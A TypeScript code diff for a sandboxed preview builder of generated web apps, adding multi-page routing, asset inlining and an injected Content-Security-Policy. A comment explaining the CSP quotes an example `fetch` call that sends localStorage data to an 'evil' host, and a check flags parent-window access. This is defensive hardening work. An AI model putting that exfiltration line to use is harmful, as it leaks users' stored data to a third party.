@@ -15,6 +15,10 @@
 
 import type { Check, DesignTweak, FileEntry } from '../types'
 import { MAX_TOTAL_BYTES } from '../types'
+import { emptyAssetSink, inlineAssets, type AssetSink } from './assets'
+import { byteLength } from './bytes'
+import { expandIcons, type ExpandedIcons } from './icons'
+import { buildShell, CARRY_KEY, collectPages, localPageLinks, pageRoute, type PageUnit, type ShellPage } from './pages'
 import { injectTweak, usesDesignTokens } from './tweak'
 
 export interface AssembleResult {
@@ -45,8 +49,22 @@ export function scriptSyntax(code: string): string | null {
 
 const LOCAL_URL = /^(?!https?:|data:|mailto:|tel:|#|\/\/)/i
 
-function normalize(url: string): string {
-  return url.trim().replace(/^\.\//, '').replace(/^\/+/, '').replace(/[?#].*$/, '')
+/**
+ * 本地引用 → 项目内路径。
+ *
+ * 必须按引用方所在目录解析：`pages/about.html` 里的 `../styles.css` 指的是根目录
+ * 的 styles.css，直接剥掉 `./` 会得到 `../styles.css` 这个不存在的路径，于是
+ * 第二个页面开始就"样式全丢"——这是多页面最容易踩、又最难从界面上看出原因的一处。
+ */
+function normalize(url: string, from = ''): string {
+  const clean = url.trim().replace(/[?#].*$/, '')
+  if (!clean.startsWith('.')) return clean.replace(/^\/+/, '')
+  const parts = from.split('/').slice(0, -1)
+  for (const part of clean.split('/')) {
+    if (part === '..') parts.pop()
+    else if (part !== '.' && part !== '') parts.push(part)
+  }
+  return parts.join('/')
 }
 
 function escapeJson(value: unknown): string {
@@ -84,6 +102,72 @@ export function bridgeScript(): string {
   };
   post({ kind: 'ready' });
 
+  /*
+   * 心跳应答。宿主每秒 ping 一次，连续几秒收不到 pong 就认定"应用卡住了"。
+   *
+   * 这段代码本身也可能排不上队：while(true){} 会把整个渲染进程的主线程占死，
+   * 壳和页面一起哑掉 —— 这恰恰是我们要判定的现象，所以不需要更聪明的办法。
+   */
+  addEventListener('message', function (e) {
+    var id = e.data && e.data.__nucleus_ping;
+    if (id === undefined) return;
+    post({ kind: 'pong', id: id });
+  });
+
+  /*
+   * 弹窗：沙箱里已经没有 allow-popups，原生 window.open 会返回 null 且什么都不发生。
+   * 交给宿主开标签页 —— 用户看到的是"链接真的打开了"，而不是"点了没反应"。
+   * 顺带把 target=_blank / 外链的点击也收上来，理由同上。
+   */
+  window.open = function (url) {
+    if (url) post({ kind: 'open', url: String(url) });
+    return null;
+  };
+  addEventListener('click', function (e) {
+    var node = e.target;
+    var link = node && node.closest ? node.closest('a[href]') : null;
+    if (!link) return;
+    var href = link.getAttribute('href') || '';
+    if (!href || href.charAt(0) === '#') return;
+    var blank = (link.getAttribute('target') || '').toLowerCase() === '_blank';
+    if (!blank && !/^https?:\\/\\//i.test(href)) return;
+    e.preventDefault();
+    post({ kind: 'open', url: link.href || href });
+  }, true);
+
+  /**
+   * 多页面预览的页内导航：把 <a href="pages/about.html"> 翻译成路由切换。
+   *
+   * 用 URL 解析而不是手写字符串拼接：../index.html 该指到哪，交给浏览器算，
+   * 才能和"导出成真实多文件后放到静态服务器"的行为完全一致。
+   */
+  if (window.__NUCLEUS_PAGE__) {
+    addEventListener('click', function (e) {
+      var node = e.target;
+      var link = node && node.closest ? node.closest('a[href]') : null;
+      if (!link) return;
+      var href = link.getAttribute('href') || '';
+      if (!href || href.charAt(0) === '#') return;
+      var url;
+      try { url = new URL(href, 'https://nucleus.local/' + String(window.__NUCLEUS_PAGE__).replace(/^\\/+/, '')); } catch (err) { return; }
+      if (url.origin !== 'https://nucleus.local') return;
+      var path = url.pathname;
+      var tail5 = path.slice(-5).toLowerCase();
+      var tail4 = path.slice(-4).toLowerCase();
+      if (tail5 !== '.html' && tail4 !== '.htm') return;
+
+      var route = path;
+      while (route.charAt(0) === '/') route = route.slice(1);
+      route = tail5 === '.html' ? route.slice(0, -5) : route.slice(0, -4);
+      if (route.slice(-6).toLowerCase() === '/index') route = route.slice(0, -6);
+      if (route.toLowerCase() === 'index') route = '';
+      if (route.slice(0, 6).toLowerCase() === 'pages/') route = route.slice(6);
+      while (route.charAt(route.length - 1) === '/') route = route.slice(0, -1);
+      e.preventDefault();
+      post({ kind: 'navigate', to: route ? '/' + route : '/' });
+    }, true);
+  }
+
   // 宿主的设计微调：直接写到 documentElement 的内联样式上。
   // 不重载 iframe ⇒ 应用内状态、输入框内容、滚动位置全部保留；这正是"改颜色不该重新生成"的体验前提。
   // 协议：{ __nucleus_tweak: { reset: boolean, vars: { '--accent': '#...', ... } } }
@@ -109,9 +193,32 @@ export function bridgeScript(): string {
   var seed = (window.__NUCLEUS_SEED && typeof window.__NUCLEUS_SEED === 'object') ? window.__NUCLEUS_SEED : {};
   var mem = {};
   for (var k in seed) { if (Object.prototype.hasOwnProperty.call(seed, k)) mem[k] = String(seed[k]); }
+  /*
+   * 多页面预览：建帧时带来的存储快照。必须在这里合并（而不是等 message），
+   * 因为页面自己的脚本马上就会跑，等异步消息就晚了。
+   */
+  var carry = (window.${CARRY_KEY} && typeof window.${CARRY_KEY} === 'object') ? window.${CARRY_KEY} : null;
+  if (carry) { for (var ck in carry) { if (Object.prototype.hasOwnProperty.call(carry, ck)) mem[ck] = String(carry[ck]); } }
+  // 已经在跑的帧之间同步：别的页面写入时由壳广播过来
+  addEventListener('message', function (e) {
+    var s = e.data && e.data.__nucleus_store;
+    if (!s) return;
+    if (s.op === 'set') mem[String(s.key)] = String(s.value);
+    else if (s.op === 'remove') delete mem[String(s.key)];
+    else if (s.op === 'clear') mem = {};
+  });
   var probe = '__nucleus_probe__';
   var nativeOk = false;
-  try { window.localStorage.setItem(probe, '1'); window.localStorage.removeItem(probe); nativeOk = true; } catch (e) { nativeOk = false; }
+  /*
+   * 多页面预览强制走内存 shim。
+   *
+   * 沙箱文档是不透明源，各帧的 localStorage 即便"能用"也互不可见 —— 探针成功只说明
+   * 这个文档自己能写，不代表另一页读得到。统一走 shim，再由壳广播 + 建帧时携带快照，
+   * 跨页行为才是确定的（写入同时上报宿主，刷新后还能从种子恢复）。
+   */
+  if (!window.__NUCLEUS_PAGE__) {
+    try { window.localStorage.setItem(probe, '1'); window.localStorage.removeItem(probe); nativeOk = true; } catch (e) { nativeOk = false; }
+  }
   if (!nativeOk) {
     var shim = {
       getItem: function (key) { key = String(key); return Object.prototype.hasOwnProperty.call(mem, key) ? mem[key] : null; },
@@ -131,16 +238,12 @@ export function bridgeScript(): string {
 }
 
 /**
- * UTF-8 字节数。
+ * UTF-8 字节数（实现在 bytes.ts，这里转出去，历史调用点不用改）。
  *
- * 前端也要组装预览（边生成边看，见 Studio 的 liveHtml），所以这里不能直接用
- * `Buffer` —— 浏览器里没有它，一引用就抛。Node 走 Buffer，浏览器走 TextEncoder，
- * 两者对 UTF-8 的计数结果一致，体积闸门在两边判出来的结论相同。
+ * 前端也要组装预览（边生成边看，见 Studio 的 liveHtml），所以那里不能直接用
+ * `Buffer` —— 浏览器里没有它，一引用就抛。
  */
-export function byteLength(text: string): number {
-  if (typeof Buffer !== 'undefined') return Buffer.byteLength(text, 'utf8')
-  return new TextEncoder().encode(text).length
-}
+export { byteLength }
 
 function pickEntry(files: Map<string, FileEntry>): FileEntry | null {
   const exact = files.get('index.html')
@@ -158,13 +261,19 @@ export function entryPath(files: FileEntry[]): string | null {
   return pickEntry(map)?.path ?? null
 }
 
-function inlineStylesheets(html: string, files: Map<string, FileEntry>, inlined: string[], missing: string[]) {
+function inlineStylesheets(
+  html: string,
+  files: Map<string, FileEntry>,
+  inlined: string[],
+  missing: string[],
+  from: string,
+) {
   return html.replace(/<link\b[^>]*>/gi, (tag) => {
     if (!/rel\s*=\s*["']?stylesheet/i.test(tag)) return tag
     const href = /href\s*=\s*("([^"]*)"|'([^']*)')/i.exec(tag)
     const raw = href?.[2] ?? href?.[3] ?? ''
     if (!raw || !LOCAL_URL.test(raw.trim())) return tag
-    const path = normalize(raw)
+    const path = normalize(raw, from)
     const file = files.get(path)
     if (!file) {
       missing.push(path)
@@ -176,12 +285,18 @@ function inlineStylesheets(html: string, files: Map<string, FileEntry>, inlined:
   })
 }
 
-function inlineScripts(html: string, files: Map<string, FileEntry>, inlined: string[], missing: string[]) {
+function inlineScripts(
+  html: string,
+  files: Map<string, FileEntry>,
+  inlined: string[],
+  missing: string[],
+  from: string,
+) {
   return html.replace(/<script\b([^>]*)>\s*<\/script>/gi, (tag, attrs: string) => {
     const src = /src\s*=\s*("([^"]*)"|'([^']*)')/i.exec(attrs)
     const raw = src?.[2] ?? src?.[3] ?? ''
     if (!raw || !LOCAL_URL.test(raw.trim())) return tag
-    const path = normalize(raw)
+    const path = normalize(raw, from)
     const file = files.get(path)
     if (!file) {
       missing.push(path)
@@ -196,18 +311,168 @@ function inlineScripts(html: string, files: Map<string, FileEntry>, inlined: str
 }
 
 function injectBridge(html: string): string {
-  const bridge = bridgeScript()
+  return injectAfterHead(html, bridgeScript())
+}
+
+/**
+ * 预览用的内容安全策略。
+ *
+ * 沙箱（无 allow-same-origin）挡的是"碰到宿主"，挡不住"把手上的数据发出去"：
+ * 一个 `fetch('https://evil/?d=' + localStorage.getItem(...))` 在沙箱里照样能跑。
+ * `connect-src 'none'` 就是补这个口子 —— 生成物没有联网的理由，它本来也没有后端。
+ *
+ * 其它几条都是"别把能用的功能也一起关掉"：
+ *  - script/style 放开 `https:` 与 inline：CDN 脚本、内联样式是提示词允许的写法；
+ *  - img/font/media 放开 `data:` 与 `https:`：图床、字体、视频占位很常见；
+ *  - frame-src 放开 `https:`：地图/视频嵌入不至于整块消失（跨源 iframe 碰不到宿主）。
+ */
+export const CONTENT_SECURITY_POLICY = [
+  "default-src 'none'",
+  "script-src 'unsafe-inline' 'unsafe-eval' https: blob:",
+  "style-src 'unsafe-inline' https:",
+  "img-src data: blob: https:",
+  "font-src data: https:",
+  "media-src data: blob: https:",
+  "frame-src https:",
+  "connect-src 'none'",
+  "form-action 'none'",
+  "base-uri 'none'",
+].join('; ')
+
+/**
+ * 注入 CSP。必须尽可能靠前（meta 只对出现在它之后的内容生效），
+ * 所以放在组装链的最后一步 —— injectAfterHead 是"后插的在前"。
+ *
+ * 生成物自己带了 CSP 就不覆盖：那是它的作者明确表达的意图。
+ */
+function injectCsp(html: string): string {
+  if (/http-equiv\s*=\s*["']?content-security-policy/i.test(html)) return html
+  return injectAfterHead(html, `<meta http-equiv="Content-Security-Policy" content="${CONTENT_SECURITY_POLICY}">`)
+}
+
+/** 多页面预览：把"当前页在项目里的路径"告诉页面脚本，链接才能按相对路径解析。 */
+function injectPageMark(html: string, path: string): string {
+  return injectAfterHead(html, `<script data-nucleus="page">window.__NUCLEUS_PAGE__=${escapeJson(path)};</script>`)
+}
+
+/** 插到 <head> 之后；没有 head 就造一个，再没有就贴在最前面。 */
+function injectAfterHead(html: string, snippet: string): string {
   const head = /<head\b[^>]*>/i.exec(html)
   if (head) {
     const at = head.index + head[0].length
-    return html.slice(0, at) + '\n' + bridge + html.slice(at)
+    return html.slice(0, at) + '\n' + snippet + html.slice(at)
   }
   const htmlTag = /<html\b[^>]*>/i.exec(html)
   if (htmlTag) {
     const at = htmlTag.index + htmlTag[0].length
-    return html.slice(0, at) + `\n<head>${bridge}</head>` + html.slice(at)
+    return html.slice(0, at) + `\n<head>${snippet}</head>` + html.slice(at)
   }
-  return bridge + '\n' + html
+  return snippet + '\n' + html
+}
+
+interface DocSink {
+  inlined: string[]
+  missing: string[]
+  /** 图标与资产的账，最后汇总成 `icons` / `assets` 两个自检项 */
+  icons: ExpandedIcons
+  assets: AssetSink
+}
+
+/** 把一份页面文档组装成自包含 HTML：内联样式/脚本 → 资产 → 图标 → 页标记 → 桥接 → 设计微调。 */
+function buildDocument(
+  entry: { path: string; content: string },
+  files: Map<string, FileEntry>,
+  tweak: DesignTweak | undefined,
+  sink: DocSink,
+  options: { markPage?: boolean } = {},
+): string {
+  let html = inlineStylesheets(entry.content, files, sink.inlined, sink.missing, entry.path)
+  html = inlineScripts(html, files, sink.inlined, sink.missing, entry.path)
+  // 资产要在脚本内联之后：CSS 里的 url(...) 这时才在文档里，能一并换掉
+  html = inlineAssets(html, files, entry.path, sink.assets)
+  // 资产与样式/脚本共用同一份"已内联 / 缺失"账：修复轮只认 missing，
+  // 少一条它就永远不知道该补哪个文件。
+  sink.inlined.push(...sink.assets.inlined)
+  sink.missing.push(...sink.assets.missing)
+  // 图标放在桥接之前：展开后就是普通 svg，桥接不必知道它存在
+  const icons = expandIcons(html)
+  html = icons.html
+  sink.icons.used.push(...icons.used)
+  sink.icons.unknown.push(...icons.unknown)
+  sink.icons.drawn += icons.drawn
+  // 顺序有讲究：injectAfterHead 每次插在 <head> 之后，即"后插的在前"。
+  // 先插桥接、再插页标记，页标记才会排在桥接之前 —— 桥接的链接翻译要读它。
+  html = injectBridge(html)
+  if (options.markPage) html = injectPageMark(html, entry.path)
+  // 微调必须最后注入：它靠"后写者胜"覆盖应用自带的 :root 变量
+  html = injectTweak(html, tweak)
+  // CSP 再往后一步：injectAfterHead 是"后插的在前"，它要抢在所有资源之前
+  html = injectCsp(html)
+  return html
+}
+
+/**
+ * 图标与资产的自检项。
+ *
+ * 都做成不阻断（info / warn）：
+ *  - 未知图标名只是"少一个图标"，为它重生成整站不值；
+ *  - 资产没内联成功时页面照样能跑，只是图不见了 —— 用户需要知道原因，而不是被拦下。
+ */
+function pushAssetChecks(checks: Check[], sink: DocSink) {
+  const used = [...new Set(sink.icons.used)]
+  const unknown = [...new Set(sink.icons.unknown)]
+  const ok = unknown.length === 0
+  checks.push({
+    id: 'icons',
+    label: '图标解析',
+    ok,
+    level: 'info',
+    detail: ok
+      ? `${used.length} 个内置图标${sink.icons.drawn ? `，另有 ${sink.icons.drawn} 个自绘` : ''}`
+      : `${used.length} 个已解析，未识别：${unknown.slice(0, 5).join('、')}`,
+  })
+
+  const skipped = sink.assets.skipped
+  checks.push({
+    id: 'assets',
+    label: '图片资产内联',
+    ok: skipped.length === 0,
+    level: 'warn',
+    detail:
+      sink.assets.inlined.length === 0 && skipped.length === 0
+        ? '没有本地图片资产'
+        : `${sink.assets.inlined.length} 个已内联（约 ${(sink.assets.bytes / 1024).toFixed(1)} KB）` +
+          (skipped.length ? `；未处理：${skipped.slice(0, 3).map((item) => `${item.path}（${item.reason}）`).join('、')}` : ''),
+  })
+}
+
+function newSink(): DocSink {
+  return {
+    inlined: [],
+    missing: [],
+    icons: { html: '', used: [], unknown: [], drawn: 0 },
+    assets: emptyAssetSink(),
+  }
+}
+
+/** 语法体检：所有 .js 都过一遍（多页面时也一样，一个坏脚本就能让整站白屏）。 */
+function pushSyntaxChecks(files: Map<string, FileEntry>, checks: Check[], broken: string[]) {
+  for (const file of files.values()) {
+    if (!/\.js$/i.test(file.path)) continue
+    const problem = scriptSyntax(file.content)
+    if (problem) {
+      broken.push(file.path)
+      checks.push({
+        id: `syntax:${file.path}`,
+        label: `${file.path} 语法`,
+        ok: false,
+        level: 'block',
+        detail: problem.slice(0, 160),
+      })
+    } else {
+      checks.push({ id: `syntax:${file.path}`, label: `${file.path} 语法`, ok: true, level: 'block' })
+    }
+  }
 }
 
 export function assemble(input: FileEntry[], tweak?: DesignTweak): AssembleResult {
@@ -220,6 +485,8 @@ export function assemble(input: FileEntry[], tweak?: DesignTweak): AssembleResul
   const broken: string[] = []
   const checks: Check[] = []
 
+  const sink = newSink()
+
   if (!entryFile) {
     checks.push({
       id: 'entry',
@@ -231,20 +498,20 @@ export function assemble(input: FileEntry[], tweak?: DesignTweak): AssembleResul
     return { html: '', entry: null, checks, inlined, missing, broken }
   }
 
+  const pages = collectPages(input)
+  // 只有一个 HTML 时走原来的单页路径：既有项目的行为必须逐字节不变
+  if (pages.length >= 2) return assembleMultiPage(pages, entryFile, files, tweak)
+
   checks.push({ id: 'entry', label: '入口文件存在', ok: true, level: 'block', detail: entryFile.path })
 
-  let html = inlineStylesheets(entryFile.content, files, inlined, missing)
-  html = inlineScripts(html, files, inlined, missing)
-  html = injectBridge(html)
-  // 微调必须最后注入：它靠"后写者胜"覆盖应用自带的 :root 变量
-  html = injectTweak(html, tweak)
+  let html = buildDocument(entryFile, files, tweak, sink)
 
   checks.push({
     id: 'refs',
     label: '引用完整性',
-    ok: missing.length === 0,
+    ok: sink.missing.length === 0,
     level: 'warn',
-    detail: missing.length ? '缺失：' + missing.join('、') : `已内联 ${inlined.length} 个资源`,
+    detail: sink.missing.length ? '缺失：' + sink.missing.join('、') : `已内联 ${sink.inlined.length} 个资源`,
   })
 
   const hasStructure = /<html\b/i.test(html) && /<body\b/i.test(html)
@@ -302,25 +569,138 @@ export function assemble(input: FileEntry[], tweak?: DesignTweak): AssembleResul
         : '未声明设计令牌，实时微调可能不生效',
   })
 
+  pushAssetChecks(checks, sink)
+
   // 语法体检：一个写到一半的字符串会让整个应用静默白屏，结构检查是看不出来的
-  for (const file of files.values()) {
-    if (!/\.js$/i.test(file.path)) continue
-    const problem = scriptSyntax(file.content)
-    if (problem) {
-      broken.push(file.path)
-      checks.push({
-        id: `syntax:${file.path}`,
-        label: `${file.path} 语法`,
-        ok: false,
-        level: 'block',
-        detail: problem.slice(0, 160),
-      })
-    } else {
-      checks.push({ id: `syntax:${file.path}`, label: `${file.path} 语法`, ok: true, level: 'block' })
+  pushSyntaxChecks(files, checks, broken)
+
+  return {
+    html,
+    entry: entryFile.path,
+    checks,
+    inlined: [...new Set(sink.inlined)],
+    missing: [...new Set(sink.missing)],
+    broken,
+  }
+}
+
+/**
+ * 多页面：每页组装成独立文档，再套一个路由壳（见 pages.ts 里的取舍说明）。
+ *
+ * 与单页的差别只有"产物形态"：检查项一一对应，missing 除了缺 css/js，
+ * 还会收进"链接指向了不存在的页面" —— 这类问题在单页项目里不存在，
+ * 但它和"页面引用了 app.js 却没输出"是同一类故障，交给同一个修复轮处理。
+ */
+function assembleMultiPage(
+  pages: PageUnit[],
+  entryFile: FileEntry,
+  files: Map<string, FileEntry>,
+  tweak: DesignTweak | undefined,
+): AssembleResult {
+  const broken: string[] = []
+  const checks: Check[] = []
+  const sink = newSink()
+
+  checks.push({ id: 'entry', label: '入口文件存在', ok: true, level: 'block', detail: entryFile.path })
+
+  const docs: ShellPage[] = []
+  for (const page of pages) {
+    const doc = buildDocument({ path: page.path, content: page.content }, files, tweak, sink, { markPage: true })
+    docs.push({ route: page.route, title: page.title, doc })
+    // 指向不存在页面的链接：点了就是 404，趁修复轮让它补出来
+    for (const href of localPageLinks(page.content)) {
+      // 先按本页目录解析（../index.html），再折算成路由
+      const target = pageRoute(normalize(href, page.path))
+      if (!pages.some((item) => item.route === target)) sink.missing.push(href)
     }
   }
 
-  return { html, entry: entryFile.path, checks, inlined, missing, broken }
+  checks.push({
+    id: 'pages',
+    label: '多页面路由',
+    ok: true,
+    level: 'info',
+    detail: `${pages.length} 个页面：${pages.map((page) => page.route).join('、')}`,
+  })
+
+  const html = buildShell(docs)
+
+  checks.push({
+    id: 'refs',
+    label: '引用完整性',
+    ok: sink.missing.length === 0,
+    level: 'warn',
+    detail: sink.missing.length
+      ? '缺失：' + [...new Set(sink.missing)].join('、')
+      : `已内联 ${new Set(sink.inlined).size} 个资源`,
+  })
+
+  const indexDoc = docs.find((doc) => doc.route === '/')?.doc ?? docs[0]?.doc ?? ''
+  const hasStructure = /<html\b/i.test(indexDoc) && /<body\b/i.test(indexDoc)
+  checks.push({
+    id: 'structure',
+    label: 'HTML 结构完整',
+    ok: hasStructure,
+    level: 'warn',
+    detail: hasStructure ? '各页面 <html> / <body> 正常' : '入口页面缺少 <html> 或 <body>，浏览器会自行补全但不保证样式',
+  })
+
+  const totalBytes = byteLength(html)
+  checks.push({
+    id: 'size',
+    label: '体积在预算内',
+    ok: totalBytes <= MAX_TOTAL_BYTES,
+    level: 'warn',
+    detail: `${(totalBytes / 1024).toFixed(1)} KB / ${(MAX_TOTAL_BYTES / 1024).toFixed(0)} KB（${pages.length} 个页面共享预算）`,
+  })
+
+  const external: string[] = []
+  for (const match of html.matchAll(/(?:src|href)\s*=\s*["'](https?:\/\/[^"']+)["']/gi)) {
+    if (match[1]) external.push(match[1])
+  }
+  checks.push({
+    id: 'external',
+    label: '外部依赖检查',
+    ok: true,
+    level: 'info',
+    detail: external.length
+      ? `${external.length} 个外链资源（离线不可用）：${external.slice(0, 3).join('、')}`
+      : '完全自包含，可离线运行',
+  })
+
+  const risky = /(?:parent\.document|top\.document|window\.top\.location|parent\.location)/i.test(html)
+  checks.push({
+    id: 'sandbox_safe',
+    label: '沙箱越权检查',
+    ok: !risky,
+    level: 'warn',
+    detail: risky ? '检测到对父窗口的访问，预览沙箱下会被拦截' : '未发现跨窗口访问',
+  })
+
+  checks.push({
+    id: 'theme_vars',
+    label: '可用设计令牌',
+    ok: /--accent\s*:/.test(html),
+    level: 'info',
+    detail: /--accent\s*:/.test(html)
+      ? '声明了 --accent，支持实时改主色'
+      : usesDesignTokens(html)
+        ? '只有 --radius：圆角可实时微调，主色需要重新生成'
+        : '未声明设计令牌，实时微调可能不生效',
+  })
+
+  pushAssetChecks(checks, sink)
+
+  pushSyntaxChecks(files, checks, broken)
+
+  return {
+    html,
+    entry: entryFile.path,
+    checks,
+    inlined: [...new Set(sink.inlined)],
+    missing: [...new Set(sink.missing)],
+    broken,
+  }
 }
 
 /** 供分享页 / 导出使用：往组装结果里塞入持久化种子。 */
